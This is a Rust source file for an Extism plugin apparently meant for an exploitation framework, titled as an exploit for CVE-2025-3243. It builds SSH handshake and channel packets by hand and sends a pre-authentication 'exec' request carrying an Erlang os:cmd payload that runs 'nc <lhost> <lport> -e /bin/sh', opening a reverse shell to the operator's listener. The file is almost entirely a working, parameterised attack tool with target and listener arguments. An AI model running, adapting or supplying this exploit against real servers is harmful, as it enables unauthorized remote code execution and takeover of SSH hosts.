use extism_pdk::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::thread;
use std::time::Duration;

#[derive(Serialize, Deserialize)]
struct PluginArgs {
    lhost: String,
    lport: u16,
    rhost: String,
    rport: u16,
}

#[derive(Serialize)]
struct JsonSchema {
    #[serde(rename = "type")]
    schema_type: String,
    properties: SchemaProperties,
    required: Vec<String>,
}

#[derive(Serialize)]
struct SchemaProperties {
    lhost: PropertySchema,
    lport: PropertySchema,
    rhost: PropertySchema,
    rport: PropertySchema,
}

#[derive(Serialize)]
struct PropertySchema {
    #[serde(rename = "type")]
    prop_type: String,
    description: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    default: Option<Value>,
}

#[plugin_fn]
pub fn name() -> FnResult<String> {
    Ok("cve-2025-3243-exploit".to_string())
}

#[plugin_fn]
pub fn description() -> FnResult<String> {
    Ok("Exploit plugin for CVE-2025-3243 - SSH pre-auth channel request with Erlang RCE payload to get a reverse shell".to_string())
}

#[plugin_fn]
pub fn json_schema() -> FnResult<String> {
    let schema = JsonSchema {
        schema_type: "object".to_string(),
        properties: SchemaProperties {
            lhost: PropertySchema {
                prop_type: "string".to_string(),
                description: "Local host/IP to receive the reverse shell (required)".to_string(),
                default: None,
            },
            lport: PropertySchema {
                prop_type: "integer".to_string(),
                description: "Local port to receive the reverse shell (required)".to_string(),
                default: None,
            },
            rhost: PropertySchema {
                prop_type: "string".to_string(),
                description: "Target SSH server IP (required)".to_string(),
                default: None,
            },
            rport: PropertySchema {
                prop_type: "integer".to_string(),
                description: "Target SSH server port (required)".to_string(),
                default: None,
            },
        },
        required: vec!["lhost".to_string(), "lport".to_string(), "rhost".to_string(), "rport".to_string()],
    };
    
    Ok(serde_json::to_string(&schema)?)
}

// Helper function to create a string payload (length-prefixed UTF-8 string)
fn string_payload(s: &str) -> Vec<u8> {
    let b = s.as_bytes();
    let mut result = Vec::new();
    result.extend_from_slice(&(b.len() as u32).to_be_bytes());
    result.extend_from_slice(b);
    result
}

// Build SSH_MSG_CHANNEL_OPEN packet
fn build_channel_open(channel_id: u32) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.push(0x5a); // SSH_MSG_CHANNEL_OPEN
    packet.extend_from_slice(&string_payload("session"));
    packet.extend_from_slice(&channel_id.to_be_bytes());
    packet.extend_from_slice(&0x68000u32.to_be_bytes()); // initial window size
    packet.extend_from_slice(&0x10000u32.to_be_bytes()); // max packet size
    packet
}

// Build SSH_MSG_CHANNEL_REQUEST packet with Erlang RCE payload
fn build_channel_request(channel_id: u32, lhost: &str, lport: u16) -> Vec<u8> {
    // Erlang RCE payload using netcat; trailing period is required
    let payload = format!("os:cmd(\"nc {} {} -e /bin/sh\").", lhost, lport);
    
    let mut packet = Vec::new();
    packet.push(0x62); // SSH_MSG_CHANNEL_REQUEST
    packet.extend_from_slice(&channel_id.to_be_bytes());
    packet.extend_from_slice(&string_payload("exec"));
    packet.push(0x01); // want_reply = True
    packet.extend_from_slice(&string_payload(&payload));
    packet
}

// Build SSH_MSG_KEXINIT packet
fn build_kexinit() -> Vec<u8> {
    let cookie = vec![0u8; 16];
    
    let mut packet = Vec::new();
    packet.push(0x14); // SSH_MSG_KEXINIT
    packet.extend_from_slice(&cookie);
    
    // KEX algorithms
    packet.extend_from_slice(&string_payload("curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256"));
    // Server host key algorithms
    packet.extend_from_slice(&string_payload("rsa-sha2-256,rsa-sha2-512"));
    // Encryption algorithms (client to server)
    packet.extend_from_slice(&string_payload("aes128-ctr"));
    // Encryption algorithms (server to client)
    packet.extend_from_slice(&string_payload("aes128-ctr"));
    // MAC algorithms (client to server)
    packet.extend_from_slice(&string_payload("hmac-sha1"));
    // MAC algorithms (server to client)
    packet.extend_from_slice(&string_payload("hmac-sha1"));
    // Compression algorithms (client to server)
    packet.extend_from_slice(&string_payload("none"));
    // Compression algorithms (server to client)
    packet.extend_from_slice(&string_payload("none"));
    // Languages (client to server)
    packet.extend_from_slice(&string_payload(""));
    // Languages (server to client)
    packet.extend_from_slice(&string_payload(""));
    
    packet.push(0x00); // first_kex_packet_follows
    packet.extend_from_slice(&0u32.to_be_bytes()); // reserved
    packet
}

// Pad packet according to SSH protocol (block size = 8)
fn pad_packet(pkt: &[u8], block_size: usize) -> Vec<u8> {
    let min_pad = 4;
    let pad_len = block_size - ((pkt.len() + 5) % block_size);
    let pad_len = if pad_len < min_pad {
        pad_len + block_size
    } else {
        pad_len
    };
    
    let total_len = pkt.len() + 1 + pad_len;
    let mut result = Vec::new();
    result.extend_from_slice(&(total_len as u32).to_be_bytes());
    result.push(pad_len as u8);
    result.extend_from_slice(pkt);
    result.extend_from_slice(&vec![0u8; pad_len]);
    result
}

// Declare TCP host functions provided by the harness
// These are raw host functions that return values directly (not wrapped in Result)
extern "C" {
    fn tcp_connect(addr_offset: u64) -> u32;
    fn tcp_send(conn_id: u32, data_offset: u64, data_len: u64) -> u32;
    fn tcp_recv(conn_id: u32, max_len: u32) -> u64;
    fn tcp_close(conn_id: u32);
}

// Attempt to connect and exploit the SSH server using raw TCP host functions
fn exploit_ssh(rhost: &str, rport: u16, lhost: &str, lport: u16) -> Value {
    let target_addr = format!("{}:{}", rhost, rport);
    
    // Build the exploit packets exactly as the Python script does
    let banner = b"SSH-2.0-OpenSSH_8.9\r\n";
    let kexinit = pad_packet(&build_kexinit(), 8);
    let channel_open = pad_packet(&build_channel_open(0), 8);
    let channel_request = pad_packet(&build_channel_request(0, lhost, lport), 8);
    
    // Write target address to plugin memory (null-terminated string)
    let addr_mem = match Memory::new(&target_addr) {
        Ok(mem) => mem,
        Err(e) => {
            return json!({
                "target": target_addr,
                "listener": format!("{}:{}", lhost, lport),
                "status": "error",
                "error": format!("Failed to allocate memory for address: {}", e)
            });
        }
    };
    
    // Connect to target
    let conn_id = unsafe { tcp_connect(addr_mem.offset()) };
    if conn_id == 0 {
        return json!({
            "target": target_addr,
            "listener": format!("{}:{}", lhost, lport),
            "status": "error",
            "error": format!("Failed to connect to {}", target_addr)
        });
    }
    
    let mut steps = Vec::new();
    let mut success = true;
    
    // Step 1: Send banner
    let banner_vec = banner.to_vec();
    let banner_mem = match Memory::new(&banner_vec) {
        Ok(mem) => mem,
        Err(e) => {
            let _ = unsafe { tcp_close(conn_id) };
            return json!({
                "target": target_addr,
                "listener": format!("{}:{}", lhost, lport),
                "status": "error",
                "error": format!("Failed to allocate memory for banner: {}", e)
            });
        }
    };
    
    let bytes_sent = unsafe { tcp_send(conn_id, banner_mem.offset(), banner.len() as u64) };
    steps.push(json!({
        "step": "send_banner",
        "bytes_sent": bytes_sent,
        "success": bytes_sent > 0
    }));
    if bytes_sent == 0 {
        success = false;
    }
    
    // Wait 0.3 seconds
    thread::sleep(Duration::from_millis(300));
    
    // Step 2: Send KEXINIT
    let kexinit_mem = match Memory::new(&kexinit) {
        Ok(mem) => mem,
        Err(e) => {
            let _ = unsafe { tcp_close(conn_id) };
            return json!({
                "target": target_addr,
                "listener": format!("{}:{}", lhost, lport),
                "status": "error",
                "error": format!("Failed to allocate memory for kexinit: {}", e)
            });
        }
    };
    
    let bytes_sent = unsafe { tcp_send(conn_id, kexinit_mem.offset(), kexinit.len() as u64) };
    steps.push(json!({
        "step": "send_kexinit",
        "bytes_sent": bytes_sent,
        "success": bytes_sent > 0
    }));
    if bytes_sent == 0 {
        success = false;
    }
    
    thread::sleep(Duration::from_millis(300));
    
    // Step 3: Send channel open
    let channel_open_mem = match Memory::new(&channel_open) {
        Ok(mem) => mem,
        Err(e) => {
            let _ = unsafe { tcp_close(conn_id) };
            return json!({
                "target": target_addr,
                "listener": format!("{}:{}", lhost, lport),
                "status": "error",
                "error": format!("Failed to allocate memory for channel_open: {}", e)
            });
        }
    };
    
    let bytes_sent = unsafe { tcp_send(conn_id, channel_open_mem.offset(), channel_open.len() as u64) };
    steps.push(json!({
        "step": "send_channel_open",
        "bytes_sent": bytes_sent,
        "success": bytes_sent > 0
    }));
    if bytes_sent == 0 {
        success = false;
    }
    
    thread::sleep(Duration::from_millis(300));
    
    // Step 4: Send channel request with Erlang RCE payload
    let channel_request_mem = match Memory::new(&channel_request) {
        Ok(mem) => mem,
        Err(e) => {
            let _ = unsafe { tcp_close(conn_id) };
            return json!({
                "target": target_addr,
                "listener": format!("{}:{}", lhost, lport),
                "status": "error",
                "error": format!("Failed to allocate memory for channel_request: {}", e)
            });
        }
    };
    
    let bytes_sent = unsafe { tcp_send(conn_id, channel_request_mem.offset(), channel_request.len() as u64) };
    steps.push(json!({
        "step": "send_channel_request",
        "bytes_sent": bytes_sent,
        "success": bytes_sent > 0,
        "payload": format!("os:cmd(\"nc {} {} -e /bin/sh\").", lhost, lport)
    }));
    if bytes_sent == 0 {
        success = false;
    }
    
    // Try to read any immediate response
    let response_offset = unsafe { tcp_recv(conn_id, 1024) };
    let response_data = if response_offset > 0 {
        match Memory::find(response_offset) {
            Some(mem) => {
                let data = mem.to_vec();
                Some(hex::encode(&data))
            }
            None => None
        }
    } else {
        None
    };
    
    // Close connection
    unsafe { tcp_close(conn_id); }
    
    json!({
        "target": target_addr,
        "listener": format!("{}:{}", lhost, lport),
        "status": if success { "payload_sent" } else { "partial_failure" },
        "steps": steps,
        "response": response_data,
        "payload_details": {
            "erlang_command": format!("os:cmd(\"nc {} {} -e /bin/sh\").", lhost, lport),
            "reverse_shell": format!("nc {} {} -e /bin/sh", lhost, lport)
        },
        "note": "Payload sent. If the server is vulnerable, check your listener for the reverse shell connection."
    })
}

#[plugin_fn]
pub fn execute() -> FnResult<Json<Value>> {
    // Read input JSON args and deserialize
    let input: Json<PluginArgs> = input()?;
    let args = input.0;
    
    // Validate required parameters
    if args.lhost.is_empty() {
        return Err(WithReturnCode::new(
            Error::msg("lhost parameter is required"),
            1,
        ));
    }
    
    if args.lport == 0 {
        return Err(WithReturnCode::new(
            Error::msg("lport parameter is required and must be > 0"),
            1,
        ));
    }
    
    if args.rhost.is_empty() {
        return Err(WithReturnCode::new(
            Error::msg("rhost parameter is required"),
            1,
        ));
    }
    
    if args.rport == 0 {
        return Err(WithReturnCode::new(
            Error::msg("rport parameter is required and must be > 0"),
            1,
        ));
    }
    
    // Execute the exploit
    let result = exploit_ssh(&args.rhost, args.rport, &args.lhost, args.lport);
    
    Ok(Json(result))
}
